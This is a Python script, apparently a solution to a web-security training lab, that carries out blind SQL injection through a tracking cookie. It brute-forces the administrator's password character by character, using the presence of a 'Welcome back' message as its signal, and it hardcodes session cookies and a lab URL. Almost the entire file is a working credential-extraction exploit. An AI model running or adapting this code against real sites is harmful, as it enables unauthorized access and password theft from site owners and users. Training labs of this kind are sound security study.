import sys
import requests
import urllib3.exceptions
import urllib.parse

# -----------------------------------------------------------
# Using Blind SQL injection on a site with trackable cookies.
# The program, using the brute force method,
# monitors changes on the site after the SQL query and selects a symbol for the password
# The results of the SQL query are not returned, and no error messages are displayed.
# But the web application includes a "Welcome back" message in the page if the query returns any rows.
# -----------------------------------------------------------

# Turn off all certificate warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Tracking cookie
trackingId = 'VY6hddBkHNEqEED3'
session = 'gU5By9nAwRut4YaUQKA2gcRKw4GNuTY9'

sql_payload = "' AND (SELECT ASCII(SUBSTRING(password,%s,1)) FROM users WHERE " \
                          "username='administrator')='%s'--"


def sql_password(url):
    password_extracted = ""

    # Number of characters in the password
    numb_char = 21
    for i in range(1, numb_char):
        # ASCII characters from space to ~
        for j in range(32, 126):
            sql_payload_encoded = urllib.parse.quote(sql_payload % (i, j))
            cookies = {'TrackingId': '%s' % trackingId + sql_payload_encoded,
                       'session': '%s' % session}

            r = requests.get(url, cookies=cookies, verify=False)

            # Track changes on the page after sql payload
            if "Welcome back" not in r.text:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
            else:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break


def main():
    if len(sys.argv) == 2:
        url = sys.argv[1]
    else:
        url = 'https://0a8200030384b378c0e45364002800b6.web-security-academy.net/'

    print("Retrieving administrator password...")
    sql_password(url)


if __name__ == '__main__':
    main()
